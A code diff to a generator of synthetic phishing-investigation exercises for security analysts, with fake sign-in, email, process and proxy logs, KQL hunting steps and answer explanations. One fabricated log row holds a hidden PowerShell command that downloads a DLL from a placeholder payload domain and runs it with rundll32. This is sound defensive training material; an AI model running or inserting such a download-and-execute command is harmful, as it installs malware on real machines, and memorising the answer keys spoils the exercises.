@@ -8,6 +8,7 @@ import type { RowRef } from '../../logs/corpus.ts';
 import { BULK_SENDERS, registeredDomain } from '../../synth/domains.ts';
 import { BIN, binaryHash } from '../../synth/software.ts';
 import { userAgentOf } from '../../logs/noise/presence.ts';
+import { mfaDetail } from '../../logs/noise/identity.ts';
 import { domain, host, ip, kdt, rubric, sha, technique, user } from './util.ts';
 
 function msgId(rng: { hex(n: number): string }): string {
@@ -26,7 +27,8 @@ const credentialPhish: CaseTemplate = {
   id: 'email-phish-credential',
   category: 'phishing',
   difficulty: 'tier1',
-  title: 'Reported email with a credential-harvesting link',
+  title: 'User-reported email',
+  lesson: 'Credential phish: submitted, then tried from abroad',
   cysaDomains: ['1.0', '3.0'],
   kind: 'incident',
   twin: 'email-benign-marketing',
@@ -64,7 +66,7 @@ const credentialPhish: CaseTemplate = {
     const tries = [0, 1].map((k) =>
       log.signin({
         TimeGenerated: tryAt + k * rng.int(30, 90) * SEC, UserPrincipalName: victim.upn, AppDisplayName: 'OfficeHome', ClientAppUsed: 'Browser', IPAddress: login, ResultType: k === 0 ? 50074 : 500121,
-        AuthenticationRequirement: 'multiFactorAuthentication', MfaDetail: 'Mobile app notification', MfaResult: k === 0 ? '' : 'MFA denied; user did not respond to mobile app notification', ConditionalAccessStatus: 'notApplied',
+        AuthenticationRequirement: 'multiFactorAuthentication', MfaDetail: mfaDetail(victim.mfaMethod), MfaResult: k === 0 ? '' : 'MFA denied; user did not respond to mobile app notification', ConditionalAccessStatus: 'notApplied',
         IncomingTokenType: 'none', DeviceId: '', DeviceName: '', IsCompliant: false, IsManaged: false, OperatingSystem: 'Linux', Browser: 'Chrome 124.0.0', UserAgent: 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36', RiskLevelDuringSignIn: 'high',
       }),
     );
@@ -159,7 +161,8 @@ const attachmentPhish: CaseTemplate = {
   id: 'email-phish-attachment',
   category: 'phishing',
   difficulty: 'tier2',
-  title: 'Malicious invoice attachment removed after delivery',
+  title: 'Attachment removed after delivery',
+  lesson: 'HTML-smuggling invoice opened before ZAP',
   cysaDomains: ['1.0', '3.0'],
   kind: 'incident',
   stages: ['initial-access'],
@@ -180,12 +183,17 @@ const attachmentPhish: CaseTemplate = {
     const tSend = at - rng.int(70, 110) * MIN;
     const zapAt = tSend + rng.int(20, 45) * MIN;
     const id = msgId(rng);
-    const recipients = rng.shuffle(finance);
-    if (!recipients.includes(opener)) recipients.unshift(opener);
+    const recipients = rng.shuffle(finance.filter((p) => p !== opener));
+    recipients.unshift(opener);
+    // First wave lands before the verdict flips; the rest of the campaign
+    // arrives after it and is blocked at the gateway.
+    const firstWave = Math.max(2, Math.ceil(recipients.length / 2));
     const delivered: RowRef<'EmailEvents'>[] = [];
+    const arrivals = new Map<string, number>();
     recipients.forEach((p, i) => {
-      const t = tSend + i * rng.int(20, 90) * SEC;
-      const early = t < zapAt - 5 * MIN || p === opener;
+      const early = i < firstWave;
+      const t = early ? tSend + i * rng.int(20, 90) * SEC : zapAt + rng.int(5, 25) * MIN + i * rng.int(10, 60) * SEC;
+      arrivals.set(p.id, t);
       const row = log.email({
         TimeGenerated: t, NetworkMessageId: id, SenderFromAddress: sender, SenderDisplayName: 'Accounts Receivable', SenderMailFromDomain: sendDomain, SenderIPv4: senderIp, RecipientEmailAddress: p.upn, Subject: subject,
         EmailDirection: 'Inbound', DeliveryAction: early ? 'Delivered' : 'Blocked', DeliveryLocation: early ? 'Inbox' : 'Quarantine', SPF: 'pass', DKIM: 'none', DMARC: 'pass', BulkComplaintLevel: 1, Urls: '',
@@ -196,7 +204,7 @@ const attachmentPhish: CaseTemplate = {
     // One recipient opened it before ZAP.
     const dev = idx.deviceOf(opener);
     const w = pick.where(opener, zapAt - 10 * MIN);
-    const tOpen = Math.min(zapAt - rng.int(3, 8) * MIN, tSend + rng.int(8, 14) * MIN);
+    const tOpen = arrivals.get(opener.id)! + rng.int(4, Math.max(5, Math.floor((zapAt - arrivals.get(opener.id)!) / MIN) - 3)) * MIN;
     const cache = `C:\\Users\\${opener.sam}\\AppData\\Local\\Microsoft\\Windows\\INetCache\\Content.Outlook\\${rng.alnum(8).toUpperCase()}`;
     const iso = `Invoice_${n}.iso`;
     const isoHash = ctx.infra.hash('payload');
@@ -205,10 +213,11 @@ const attachmentPhish: CaseTemplate = {
     const browser = log.proc({ TimeGenerated: tOpen + 3 * SEC, DeviceName: dev.name, AccountName: opener.sam, FileName: 'msedge.exe', FolderPath: BIN.msedge.path, ProcessCommandLine: `"${BIN.msedge.path}" --single-argument ${cache}\\${file}`, SHA256: binaryHash('msedge.exe'), Signer: BIN.msedge.signer, ProcessIntegrityLevel: 'Medium', InitiatingProcessFileName: 'outlook.exe', InitiatingProcessCommandLine: `"${BIN.outlook.path}"` });
     const isoDrop = log.file({ TimeGenerated: tOpen + rng.int(4, 9) * SEC, DeviceName: dev.name, ActionType: 'FileCreated', FileName: iso, FolderPath: `C:\\Users\\${opener.sam}\\Downloads\\${iso}`, FileSize: rng.int(900_000, 2_400_000), SHA256: isoHash, InitiatingProcessFileName: 'msedge.exe', InitiatingProcessAccountName: opener.sam });
     const tRun = tOpen + rng.int(40, 120) * SEC;
-    const ps = log.proc({ TimeGenerated: tRun, DeviceName: dev.name, AccountName: opener.sam, FileName: 'powershell.exe', FolderPath: BIN.powershell.path, ProcessCommandLine: `powershell.exe -nop -w hidden -c "iwr https://${payloadDomain}/i/${rng.alnum(6)} -OutFile $env:TEMP\\u.dll; rundll32 $env:TEMP\\u.dll,Start"`, SHA256: binaryHash('powershell.exe'), Signer: BIN.powershell.signer, ProcessIntegrityLevel: 'Medium', InitiatingProcessFileName: 'explorer.exe', InitiatingProcessCommandLine: `E:\\Invoice_${n}.lnk` });
+    const dlPath = `/i/${rng.alnum(6)}`;
+    const ps = log.proc({ TimeGenerated: tRun, DeviceName: dev.name, AccountName: opener.sam, FileName: 'powershell.exe', FolderPath: BIN.powershell.path, ProcessCommandLine: `powershell.exe -nop -w hidden -c "iwr https://${payloadDomain}${dlPath} -OutFile $env:TEMP\\u.dll; rundll32 $env:TEMP\\u.dll,Start"`, SHA256: binaryHash('powershell.exe'), Signer: BIN.powershell.signer, ProcessIntegrityLevel: 'Medium', InitiatingProcessFileName: 'explorer.exe', InitiatingProcessCommandLine: `E:\\Invoice_${n}.lnk` });
     const dll = log.file({ TimeGenerated: tRun + 4 * SEC, DeviceName: dev.name, ActionType: 'FileCreated', FileName: 'u.dll', FolderPath: `C:\\Users\\${opener.sam}\\AppData\\Local\\Temp\\u.dll`, FileSize: rng.int(300_000, 800_000), SHA256: loaderHash, InitiatingProcessFileName: 'powershell.exe', InitiatingProcessAccountName: opener.sam });
     const rundll = log.proc({ TimeGenerated: tRun + 6 * SEC, DeviceName: dev.name, AccountName: opener.sam, FileName: 'rundll32.exe', FolderPath: BIN.rundll32.path, ProcessCommandLine: `rundll32 C:\\Users\\${opener.sam}\\AppData\\Local\\Temp\\u.dll,Start`, SHA256: binaryHash('rundll32.exe'), Signer: BIN.rundll32.signer, ProcessIntegrityLevel: 'Medium', InitiatingProcessFileName: 'powershell.exe', InitiatingProcessCommandLine: 'powershell.exe -nop -w hidden -c …' });
-    const dl = log.proxy({ TimeGenerated: tRun + 2 * SEC, SourceIP: w.lanIp, SourceUser: opener.sam, Method: 'GET', Url: `https://${payloadDomain}/i/${rng.alnum(6)}`, DestinationHost: payloadDomain, DestinationIP: payloadIp, StatusCode: 200, BytesSent: rng.int(300, 700), BytesReceived: rng.int(300_000, 800_000), Category: 'Newly Registered Domain', UserAgent: 'Mozilla/5.0 (Windows NT; Windows NT 10.0; en-US) WindowsPowerShell/5.1.26100.1' });
+    const dl = log.proxy({ TimeGenerated: tRun + 2 * SEC, SourceIP: w.lanIp, SourceUser: opener.sam, Method: 'GET', Url: `https://${payloadDomain}${dlPath}`, DestinationHost: payloadDomain, DestinationIP: payloadIp, StatusCode: 200, BytesSent: rng.int(300, 700), BytesReceived: rng.int(300_000, 800_000), Category: 'Newly Registered Domain', UserAgent: 'Mozilla/5.0 (Windows NT; Windows NT 10.0; en-US) WindowsPowerShell/5.1.26100.1' });
     const beacons = Array.from({ length: rng.int(3, 6) }, (_, i) =>
       log.net({ TimeGenerated: tRun + (40 + i * rng.int(50, 70)) * SEC, DeviceName: dev.name, LocalIP: w.lanIp, RemoteIP: payloadIp, RemotePort: 443, RemoteUrl: payloadDomain, InitiatingProcessFileName: 'rundll32.exe', InitiatingProcessAccountName: opener.sam }),
     );
@@ -236,7 +245,7 @@ const attachmentPhish: CaseTemplate = {
         { id: 'c2', label: `The loader is talking to ${payloadDomain}`, why: 'Active command and control from a finance laptop.', rows: [dl, ...beacons] },
       ],
       indicators: {
-        block: [domain(sendDomain, 'Sender domain'), { kind: 'email', value: sender }, sha(attachHash, file), domain(payloadDomain, 'Payload / C2'), ip(payloadIp, 'Payload / C2'), sha(loaderHash, 'u.dll loader')],
+        block: [domain(sendDomain, 'Sender domain'), { kind: 'email', value: sender }, sha(attachHash, file), sha(isoHash, iso), domain(payloadDomain, 'Payload / C2'), ip(payloadIp, 'Payload / C2'), sha(loaderHash, 'u.dll loader')],
         scope: [user(opener), host(dev.name)],
         mustNot: [domain(supplier.org.domain, 'Real supplier — also sends invoices'), host('SCCM01')],
       },
@@ -246,8 +255,8 @@ const attachmentPhish: CaseTemplate = {
         `Follow that device: DeviceProcessEvents | where DeviceName == "${dev.name}" and TimeGenerated > ${kdt(tOpen - MIN)}`,
       ],
       solution: [
-        { title: 'Scope the campaign', kql: `EmailEvents\n| where SenderFromDomain == "${sendDomain}"\n| project TimeGenerated, RecipientEmailAddress, DeliveryAction, ThreatTypes, PostDeliveryAction, PostDeliveryTime`, why: `${delivered.length} delivered before the retro verdict; the rest blocked.` },
-        { title: 'Did anyone open it?', kql: `DeviceFileEvents\n| where SHA256 == "${attachHash}" or FileName endswith ".iso"\n| project TimeGenerated, DeviceName, ActionType, FileName, FolderPath, InitiatingProcessFileName`, why: `${opener.first}'s laptop saved the HTML and the browser produced an ISO — smuggling worked.` },
+        { title: 'Scope the campaign', kql: `EmailEvents\n| where SenderFromDomain == "${sendDomain}"\n| project TimeGenerated, RecipientEmailAddress, DeliveryAction, ThreatTypes, PostDeliveryAction, PostDeliveryTime`, why: `${delivered.length} delivered before the retro verdict; the later wave was blocked.` },
+        { title: 'Did anyone open it?', kql: `DeviceFileEvents\n| where SHA256 == "${attachHash}" or FileName endswith ".iso"\n| project TimeGenerated, DeviceName, ActionType, FileName, FolderPath, SHA256, InitiatingProcessFileName`, why: `${opener.first}'s laptop saved the HTML and the browser produced an ISO — smuggling worked.` },
         { title: 'What ran?', kql: `DeviceProcessEvents\n| where DeviceName == "${dev.name}" and TimeGenerated between (${kdt(tOpen - MIN)} .. ${kdt(tRun + 5 * MIN)})\n| where FileName in ("msedge.exe", "powershell.exe", "rundll32.exe")\n| project TimeGenerated, FileName, ProcessCommandLine, InitiatingProcessFileName, InitiatingProcessCommandLine`, why: 'Browser opens the HTML; a shortcut on the mounted ISO launches hidden PowerShell; PowerShell starts rundll32 on the downloaded DLL.' },
         { title: 'The DLL on disk', kql: `DeviceFileEvents\n| where DeviceName == "${dev.name}" and FileName == "u.dll"`, why: 'Hash to block and hunt.' },
         { title: 'Is it calling home?', kql: `DeviceNetworkEvents\n| where DeviceName == "${dev.name}" and RemoteUrl == "${payloadDomain}"`, why: 'rundll32 beaconing to the payload host.' },
@@ -262,7 +271,7 @@ const attachmentPhish: CaseTemplate = {
       explanation: [
         `Asynchronous sandboxing creates a delivery window: the gateway first scored ${file} clean and delivered it, then detonation flipped the verdict and ZAP pulled the copies. ${delivered.length} inboxes had it in the meantime — so the real question is who opened it.`,
         `${opener.first} did. The HTML attachment is an HTML-smuggling page: opened in the browser, it assembled ${iso} locally and saved it to Downloads, bypassing the gateway entirely. A shortcut inside the mounted ISO launched hidden PowerShell that downloaded a DLL from ${payloadDomain} and ran it with rundll32, which is now beaconing to ${payloadIp}. Mail purge alone would have missed this.`,
-        `Escalate: isolate ${dev.name}, block the sender and payload infrastructure and all three hashes, confirm the purge, and hunt the fleet for the ISO and DLL hashes. ${opener.first}'s credentials and session should be treated as exposed.`,
+        `Escalate: isolate ${dev.name}, block the sender and payload infrastructure and all three hashes (HTML, ISO, DLL), confirm the purge, and hunt the fleet for the ISO and DLL hashes. ${opener.first}'s credentials and session should be treated as exposed.`,
       ],
       pitfalls: [
         'An initial "clean" verdict is not final when detonation is asynchronous — always look for a retro update.',
@@ -281,7 +290,8 @@ const benignMarketing: CaseTemplate = {
   id: 'email-benign-marketing',
   category: 'phishing',
   difficulty: 'tier1',
-  title: 'User-reported "phishing" newsletter',
+  title: 'User-reported email',
+  lesson: 'A legitimate, authenticated newsletter',
   cysaDomains: ['1.0'],
   kind: 'benign',
   twin: 'email-phish-credential',
